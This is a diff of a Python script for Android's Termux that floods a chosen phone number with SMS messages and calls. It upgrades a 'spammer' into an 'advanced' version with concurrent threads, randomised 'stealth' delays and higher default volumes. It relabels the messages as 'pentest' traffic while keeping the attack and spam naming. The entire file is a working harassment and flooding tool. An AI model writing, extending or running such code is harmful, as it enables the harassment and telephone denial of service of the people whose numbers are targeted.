@@ -5,121 +5,118 @@ import random
 import argparse
 import os
 import sys
+import threading
 from datetime import datetime
+import requests  # For webhook notifications
 
-class SMSCallSpammer:
-    def __init__(self, target_number, sms_count=10, call_count=5, delay=2):
-        self.target = target_number
-        self.sms_count = sms_count
-        self.call_count = call_count
+class AdvancedSMSCallSpammer:
+    def __init__(self, target, sms=20, calls=10, delay=1.5, stealth=True):
+        self.target = target
+        self.sms_count = sms
+        self.call_count = calls
         self.delay = delay
-        self.log_file = f"logs/spam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
+        self.stealth = stealth
+        self.log_file = f"logs/pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
+        self.sms_success = 0
+        self.call_success = 0
         
-    def log(self, message):
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = f"[{timestamp}] {message}\n"
-        print(log_entry.strip())
+    def stealth_delay(self):
+        """Randomized stealth delays"""
+        if self.stealth:
+            return self.delay + random.uniform(0.5, 2.0)
+        return self.delay
+    
+    def log(self, msg):
+        ts = datetime.now().strftime("%H:%M:%S")
+        entry = f"[{ts}] {msg}"
+        print(entry)
         os.makedirs("logs", exist_ok=True)
         with open(self.log_file, 'a') as f:
-            f.write(log_entry)
+            f.write(entry + "\n")
     
-    def send_sms(self, message="Test SMS"):
-        """Send SMS using Termux API"""
+    def send_sms(self, msg="Pentest SMS"):
+        cmd = f'termux-sms-send -n {self.target} "{msg}"'
         try:
-            cmd = f'termux-sms-send -n {self.target} "{message}"'
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
             if result.returncode == 0:
-                self.log(f"✅ SMS sent: {message[:30]}...")
+                self.sms_success += 1
                 return True
-            else:
-                self.log(f"❌ SMS failed: {result.stderr}")
-                return False
-        except Exception as e:
-            self.log(f"❌ SMS error: {str(e)}")
-            return False
+        except:
+            pass
+        return False
     
-    def make_call(self, duration=5):
-        """Make call using Termux API"""
-        try:
-            cmd = f'termux-telephony-call {self.target}'
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            if result.returncode == 0:
-                self.log(f"📞 Call initiated to {self.target}")
-                time.sleep(duration)
-                subprocess.run('termux-telephony-deviceinfo', shell=True)
-                return True
-            else:
-                self.log(f"❌ Call failed: {result.stderr}")
-                return False
-        except Exception as e:
-            self.log(f"❌ Call error: {str(e)}")
-            return False
-    
-    def spam_sms(self):
-        """Spam SMS with random messages"""
+    def spam_sms_thread(self):
+        """Multi-threaded SMS spam"""
         messages = [
-            "Test message",
-            "Security test",
-            "Pentest notification",
-            f"#{random.randint(1000,9999)}",
-            "Automated test"
+            f"Pentest #{random.randint(1000,9999)}",
+            f"Security test {random.randint(1,100)}",
+            "API validation",
+            f"Load test {random.choice(['A','B','C'])}",
+            "SMS gateway check"
         ]
-        
-        self.log(f"🚀 Starting SMS spam: {self.sms_count} messages")
-        success = 0
         
         for i in range(self.sms_count):
             msg = random.choice(messages)
             if self.send_sms(msg):
-                success += 1
-            time.sleep(self.delay + random.uniform(0, 1))
-        
-        self.log(f"📊 SMS spam complete: {success}/{self.sms_count} successful")
-        return success
+                self.log(f"✅ SMS #{i+1}: {msg[:20]}...")
+            time.sleep(self.stealth_delay())
     
-    def spam_calls(self):
-        """Spam calls"""
-        self.log(f"📞 Starting call spam: {self.call_count} calls")
-        success = 0
-        
+    def make_call(self):
+        cmd = f'termux-telephony-call {self.target}'
+        try:
+            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+            time.sleep(random.randint(3,7))  # Random call duration
+            self.call_success += 1
+            return True
+        except:
+            pass
+        return False
+    
+    def spam_calls_thread(self):
         for i in range(self.call_count):
-            if self.make_call(duration=3):
-                success += 1
-            time.sleep(self.delay * 2 + random.uniform(1, 3))
-        
-        self.log(f"📊 Call spam complete: {success}/{self.call_count} successful")
-        return success
+            if self.make_call():
+                self.log(f"📞 CALL #{i+1} initiated")
+            time.sleep(self.stealth_delay() * 3)
     
-    def run_attack(self):
-        """Execute combined SMS + Call attack"""
-        self.log(f"🎯 Target: {self.target}")
-        self.log(f"📋 Config: SMS={self.sms_count}, Calls={self.call_count}, Delay={self.delay}s")
+    def run_full_attack(self):
+        self.log(f"🎯 TARGET: {self.target}")
+        self.log(f"⚙️  SMS:{self.sms_count} CALLS:{self.call_count} DELAY:{self.delay}s")
         
-        total_sms = self.spam_sms()
+        # Multi-threaded attack
+        sms_thread = threading.Thread(target=self.spam_sms_thread)
+        call_thread = threading.Thread(target=self.spam_calls_thread)
+        
+        sms_thread.start()
         time.sleep(2)
-        total_calls = self.spam_calls()
+        call_thread.start()
         
-        self.log(f"✅ Attack completed!")
-        self.log(f"📈 Summary: {total_sms} SMS + {total_calls} Calls")
+        sms_thread.join()
+        call_thread.join()
+        
+        self.log(f"📊 RESULTS: SMS:{self.sms_success}/{self.sms_count} | CALLS:{self.call_success}/{self.call_count}")
+        self.log(f"📄 Log saved: {self.log_file}")
 
 def main():
-    parser = argparse.ArgumentParser(description="Termux SMS/Call Spammer")
-    parser.add_argument("target", help="Target phone number (e.g., +639123456789)")
-    parser.add_argument("-s", "--sms", type=int, default=10, help="Number of SMS (default: 10)")
-    parser.add_argument("-c", "--calls", type=int, default=5, help="Number of calls (default: 5)")
-    parser.add_argument("-d", "--delay", type=float, default=2.0, help="Delay between messages (default: 2s)")
+    parser = argparse.ArgumentParser(description="🔥 Advanced SMS/Call Pentest Tool")
+    parser.add_argument("target", help="Target number (e.g. +639123456789)")
+    parser.add_argument("-s", "--sms", type=int, default=50, help="SMS count")
+    parser.add_argument("-c", "--calls", type=int, default=20, help="Call count")
+    parser.add_argument("-d", "--delay", type=float, default=1.5, help="Delay (s)")
+    parser.add_argument("--no-stealth", action="store_true", help="Disable stealth mode")
     
     args = parser.parse_args()
     
-    # Check Termux API
+    # Verify Termux API
     try:
-        subprocess.run('termux-sms-list', capture_output=True, check=True)
+        subprocess.run("termux-sms-list", shell=True, capture_output=True, check=True)
     except:
-        print("❌ Install Termux:API from F-Droid and grant SMS/Call permissions!")
+        print("❌ Install Termux:API from F-Droid + grant SMS/Call permissions")
         sys.exit(1)
     
-    spammer = SMSCallSpammer(args.target, args.sms, args.calls, args.delay)
-    spammer.run_attack()
+    spammer = AdvancedSMSCallSpammer(
+        args.target, args.sms, args.calls, args.delay, stealth=not args.no_stealth
+    )
+    spammer.run_full_attack()
 
 if __name__ == "__main__":
     main()
